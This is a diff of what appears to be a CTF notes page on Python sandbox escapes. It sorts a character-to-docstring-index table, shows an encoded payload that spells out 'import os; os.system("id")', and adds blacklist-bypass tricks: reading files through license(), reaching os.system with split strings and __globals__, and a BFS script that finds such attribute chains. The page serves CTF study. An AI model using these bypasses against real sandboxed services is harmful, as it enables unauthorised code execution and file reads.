@@ -88,100 +88,100 @@ The most useful string attributes here are `.__doc__` and `.name`, for example, 
 
 ```python
 {
-    'h': 'id.__doc__[8]', 
-    'e': 'exit.eof[10]', 
-    'B': 'list.__doc__[0]', 
-    't': 'exit.eof[1]', 
-    'i': 'exit.eof[8]', 
-    '.': 'exit.eof[9]', 
-    'f': 'id.__doc__[21]', 
-    'c': 'dir.__doc__[9]', 
-    'l': 'exit.eof[3]', 
-    'o': 'dir.__doc__[5]', 
-    ' ': 'exit.eof[6]', 
-    's': 'id.__doc__[38]', 
     'a': 'chr.__doc__[7]', 
-    'm': 'id.__doc__[68]', 
-    'r': 'exit.eof[2]', 
-    'd': 'dir.__doc__[0]', 
-    'A': 'zip.__doc__[20]', 
-    'n': 'id.__doc__[5]', 
-    'u': 'quit.name[1]', 
     'b': 'dir.__doc__[6]', 
-    'C': 'exit.eof[0]', 
-    'p': 'map.__doc__[2]', 
-    'x': 'exit.name[1]', 
-    'I': 'all.__doc__[66]', 
-    'k': 'map.__doc__[40]', 
-    '/': 'open.__doc__[326]', 
-    'w': 'chr.__doc__[41]', 
-    'O': 'exit.eof[14]', 
-    'y': 'id.__doc__[18]', 
-    '\n': 'id.__doc__[33]', 
-    'v': 'pow.__doc__[4]', 
+    'c': 'dir.__doc__[9]', 
+    'd': 'dir.__doc__[0]', 
+    'e': 'exit.eof[10]', 
+    'f': 'id.__doc__[21]', 
     'g': 'id.__doc__[43]', 
-    ',': 'map.__doc__[8]', 
-    'R': 'id.__doc__[0]', 
-    '-': 'exit.eof[4]', 
-    ')': 'exit.eof[16]', 
-    'T': 'all.__doc__[7]', 
-    '(': 'exit.eof[7]', 
-    '>': 'set.__doc__[7]', 
-    'F': 'exit.eof[15]', 
-    'q': 'quit.name[0]', 
-    "'": 'bin.__doc__[72]', 
-    'S': 'pow.__doc__[78]', 
-    'M': 'map.__doc__[38]', 
-    'P': 'id.__doc__[108]', 
-    'N': 'filter.__doc__[19]', 
-    'W': 'max.__doc__[99]', 
-    'U': 'chr.__doc__[9]', 
-    '_': 'dir.__doc__[279]', 
-    'L': 'open.__doc__[3126]', 
-    'z': 'zip.__doc__[0]', 
-    ']': 'int.__doc__[6]', 
-    '*': 'zip.__doc__[4]', 
-    '[': 'dir.__doc__[4]', 
-    ';': 'chr.__doc__[55]', 
-    '=': 'chr.__doc__[60]', 
-    ':': 'sum.__doc__[42]', 
-    '0': 'bin.__doc__[65]', 
-    '`': 'open.__doc__[1908]', 
+    'h': 'id.__doc__[8]', 
+    'i': 'exit.eof[8]', 
     'j': 'dir.__doc__[7]', 
-    '"': 'open.__doc__[3084]', 
-    'E': 'exit.eof[13]', 
-    '$': 'abs.__text_signature__[1]', 
-    '2': 'bin.__doc__[60]', 
-    '\\': 'print.__doc__[32]', 
-    '7': 'bin.__doc__[61]', 
-    '1': 'bin.__doc__[75]', 
-    '9': 'bin.__doc__[62]', 
-    '6': 'bin.__doc__[63]', 
-    '5': 'oct.__doc__[77]', 
-    '<': 'chr.__doc__[59]', 
-    '@': 'super.__doc__[402]', 
-    '+': 'int.__doc__[407]', 
-    'J': 'classmethod.__doc__[600]', 
-    'Z': 'input.__doc__[230]', 
+    'k': 'map.__doc__[40]', 
+    'l': 'exit.eof[3]', 
+    'm': 'id.__doc__[68]', 
+    'n': 'id.__doc__[5]', 
+    'o': 'dir.__doc__[5]', 
+    'p': 'map.__doc__[2]', 
+    'q': 'quit.name[0]', 
+    'r': 'exit.eof[2]', 
+    's': 'id.__doc__[38]', 
+    't': 'exit.eof[1]', 
+    'u': 'quit.name[1]', 
+    'v': 'pow.__doc__[4]', 
+    'w': 'chr.__doc__[41]', 
+    'x': 'exit.name[1]', 
+    'y': 'id.__doc__[18]', 
+    'z': 'zip.__doc__[0]', 
+    'A': 'zip.__doc__[20]', 
+    'B': 'list.__doc__[0]', 
+    'C': 'exit.eof[0]', 
     'D': 'exit.eof[5]', 
-    '{': 'dict.__doc__[186]', 
-    '}': 'dict.__doc__[187]', 
-    '%': 'pow.__doc__[54]', 
+    'E': 'exit.eof[13]', 
+    'F': 'exit.eof[15]', 
     'G': 'iter.__doc__[65]', 
-    '3': 'hex.__doc__[71]', 
-    '8': 'hex.__doc__[69]', 
-    '4': 'hex.__doc__[68]', 
-    'V': 'int.__doc__[477]', 
-    '!': 'range.__doc__[263]', 
     'H': 'bytes.hex.__doc__[148]', 
-    'X': 'BlockingIOError.errno.__doc__[4]', 
-    '&': 'set.__iand__.__doc__[11]', 
-    '~': 'False.__invert__.__doc__[0]', 
-    '|': 'False.__or__.__doc__[11]', 
-    '^': 'set.__ixor__.__doc__[11]', 
+    'I': 'all.__doc__[66]', 
+    'J': 'classmethod.__doc__[600]', 
     'K': 'set.pop.__doc__[51]', 
+    'L': 'open.__doc__[3126]', 
+    'M': 'map.__doc__[38]', 
+    'N': 'filter.__doc__[19]', 
+    'O': 'exit.eof[14]', 
+    'P': 'id.__doc__[108]', 
     'Q': 'exit.__dir__.__qualname__[0]', 
-    'Y': 'float.__getformat__.__doc__[0]'
+    'R': 'id.__doc__[0]', 
+    'S': 'pow.__doc__[78]', 
+    'T': 'all.__doc__[7]', 
+    'U': 'chr.__doc__[9]', 
+    'V': 'int.__doc__[477]', 
+    'W': 'max.__doc__[99]', 
+    'X': 'BlockingIOError.errno.__doc__[4]', 
+    'Y': 'float.__getformat__.__doc__[0]',
+    'Z': 'input.__doc__[230]', 
+    '0': 'bin.__doc__[65]', 
+    '1': 'bin.__doc__[75]', 
+    '2': 'bin.__doc__[60]', 
+    '3': 'hex.__doc__[71]', 
+    '4': 'hex.__doc__[68]', 
+    '5': 'oct.__doc__[77]', 
+    '6': 'bin.__doc__[63]', 
+    '7': 'bin.__doc__[61]', 
+    '8': 'hex.__doc__[69]', 
+    '9': 'bin.__doc__[62]', 
+    ' ': 'exit.eof[6]', 
+    "'": 'bin.__doc__[72]', 
+    '"': 'open.__doc__[3084]', 
+    '!': 'range.__doc__[263]', 
+    '$': 'abs.__text_signature__[1]', 
+    '%': 'pow.__doc__[54]', 
+    '&': 'set.__iand__.__doc__[11]', 
+    '(': 'exit.eof[7]', 
+    ')': 'exit.eof[16]', 
+    '*': 'zip.__doc__[4]', 
+    '+': 'int.__doc__[407]', 
+    ',': 'map.__doc__[8]', 
+    '-': 'exit.eof[4]', 
+    '.': 'exit.eof[9]', 
+    '/': 'open.__doc__[326]', 
+    ':': 'sum.__doc__[42]', 
+    ';': 'chr.__doc__[55]', 
+    '<': 'chr.__doc__[59]', 
+    '=': 'chr.__doc__[60]', 
+    '>': 'set.__doc__[7]', 
+    '@': 'super.__doc__[402]', 
+    '[': 'dir.__doc__[4]', 
+    '\\': 'print.__doc__[32]', 
+    '\n': 'id.__doc__[33]', 
+    ']': 'int.__doc__[6]', 
+    '^': 'set.__ixor__.__doc__[11]', 
+    '_': 'dir.__doc__[279]', 
+    '`': 'open.__doc__[1908]', 
+    '{': 'dict.__doc__[186]', 
+    '|': 'False.__or__.__doc__[11]', 
+    '}': 'dict.__doc__[187]', 
+    '~': 'False.__invert__.__doc__[0]', 
 }
 ```
 
@@ -266,6 +266,103 @@ As an example, my Python 3.8.10 creates the following payload:
 exit.eof[8]+id.__doc__[68]+map.__doc__[2]+dir.__doc__[5]+exit.eof[2]+exit.eof[1]+exit.eof[6]+dir.__doc__[5]+id.__doc__[38]+chr.__doc__[55]+exit.eof[6]+dir.__doc__[5]+id.__doc__[38]+exit.eof[9]+id.__doc__[38]+id.__doc__[18]+id.__doc__[38]+exit.eof[1]+exit.eof[10]+id.__doc__[68]+exit.eof[7]+open.__doc__[3084]+exit.eof[8]+dir.__doc__[0]+open.__doc__[3084]+exit.eof[16]
 ```
 {% endcode %}
+
+</details>
+
+### Blacklist Bypass
+
+Some tricks to bypass specific dangerous-sounding words being blacklisted.&#x20;
+
+#### Minimal file read using `license()`
+
+If you can set the `._Printer__filenames` attribute to the built-in `license()` function you can change the function where it gets the license text data from. When you then afterward call the `license()` function it will use the overwritten files instead and print the data to STDOUT.&#x20;
+
+<pre class="language-python"><code class="lang-python"><strong>>>> license._Printer__filenames=["flag.txt"]
+</strong><strong>>>> license()
+</strong>CTF{...}
+
+<strong>>>> l=license;l._Printer__filenames=["flag.txt"];l()  # 48 bytes
+</strong>CTF{...}
+</code></pre>
+
+#### Dictionary access bypassing string
+
+If the "system" keyword is blacklisted for example, but you still want to execute the function for shell commands, you can try to access it using a string like `"sys"+"tem"` which technically doesn't include "system" when checking the input. But while executing these get combined into the required string.&#x20;
+
+To access a function in this way, you cannot directly index it on the `os` module. For these dictionary accesses, you need to access a real dictionary, not a module object. Luckily, there are methods on modules that give such a dictionary interface, like `.__dict__`. If this is also blacklisted, there may be other creative ways of accessing the same function again.&#x20;
+
+<pre class="language-python"><code class="lang-python"># Imagine you already can access the `os` module
+>>> __import__("os")
+&#x3C;module 'os' from '/usr/lib/python3.8/os.py'>
+# Use __dict__ to get a simple dictionary of its attributes
+<strong>>>> __import__("os").__dict__["system"]
+</strong>&#x3C;built-in function system>
+# Alternatively use any existing function, and walk back with __globals__
+<strong>>>> os.walk.__globals__["system"]
+</strong></code></pre>
+
+<details>
+
+<summary>Brute-Force script for attribute accessing (BFS)</summary>
+
+This is often a bit of guesswork of trying to access various special attributes to end up where you want. To ease in the creation of these types of chains I made a small script to brute-force all attributes from a root node until the target is reached.&#x20;
+
+<pre class="language-python"><code class="lang-python">import traceback  # Imagine target script already has this gadget imported
+import os
+
+BLACKLIST = ['builtins', 'dir', 'local', 'dict', 'attr', 'eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']
+
+
+def path_string(root, path):
+    result = root
+    for key, is_dict in path:
+        result += f'["{key}"]' if is_dict else f'.{key}'
+
+    return result
+
+
+# First argument will be eval'ed as root, second argument is target to reach
+def search(root, target):
+    checked = []
+    queue = [(eval(root), [])]
+
+    # Breadth First Search (BFS)
+    while queue:
+        obj, path = queue.pop(0)
+
+        if type(obj) == str:  # Skip strings (useless, and a bit faster)
+            continue
+        elif type(obj) == dict:
+            objs = obj.keys()
+        else:
+            objs = dir(obj)
+
+        for key in objs:
+            try:
+                is_dict = any(banned in key for banned in BLACKLIST)
+
+                value = obj[key] if is_dict else getattr(obj, key)
+            except (TypeError, AttributeError, KeyError):
+                continue
+
+            unique = repr(value).split('at 0x')[0]  # Remove memory address (will be different while being the same object)
+
+            if unique in checked:
+                continue  # Skip the same object (delete to find all paths, but is really slow)
+
+            new_path = path + [(key, is_dict)]
+
+            if value == target:
+                return path_string(root, new_path)
+
+            checked.append(unique)
+            queue.append((value, new_path))  # Explore child attributes
+
+
+# Try to find a path to os.system from the traceback module
+<strong>print(search("traceback", os.system))  # traceback.sys.modules["os"]._exists.__globals__["system"]
+</strong># ^^ these strings can then easily be escaped like "o"+"s" and "sys"+"tem" to bypass
+</code></pre>
 
 </details>
 
